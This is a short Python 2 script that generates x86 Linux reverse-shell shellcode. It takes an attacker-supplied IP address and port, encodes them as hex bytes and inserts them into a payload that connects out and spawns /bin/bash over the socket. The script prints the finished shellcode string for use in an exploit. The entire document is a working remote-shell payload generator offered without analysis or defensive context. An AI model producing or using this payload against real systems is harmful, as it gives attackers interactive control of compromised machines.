import socket, sys, struct

if len(sys.argv) != 3:

      print "[*] Example: /usr/bin/python wrapper.py <IP address> <port>"
      sys.exit(1)

address = sys.argv[1]

address = address.split('.')
hexaddress = hex(int(address[0])) + hex(int(address[1])) + hex(int(address[2])) + hex(int(address[3]))
hexaddress = hexaddress.replace('0x', '')
hexaddress = hexaddress.upper()

final_address = "\\x"+"\\x".join(a+b for a,b in zip(hexaddress[::2],hexaddress[1::2]))

port = sys.argv[2]
port = int(port)
port = socket.htons(port)
hexport = hex(port)
hexport = struct.pack("<H", port).encode("hex")

final_port = "\\x"+"\\x".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))

buf = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\x68\\x67\\x01\\x66\\x58\\xb3"
"\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x6a\\x01\\x66\\x58\\x89"
"\\xf3\\x52\\x68"
+ final_address + # "\xc0\xa8\x64\x8b"
"\\x66\\x68"
+ final_port + # "\x23\x28"
"\\x66\\x6a\\x02\\x89"
"\\xe1\\xb2\\x1e\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\x66\\x6a\\x3f\\x66"
"\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf1\\x31\\xc0\\x50\\x68\\x62\\x61"
"\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50"
"\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80")


print '"' + (buf) + '"'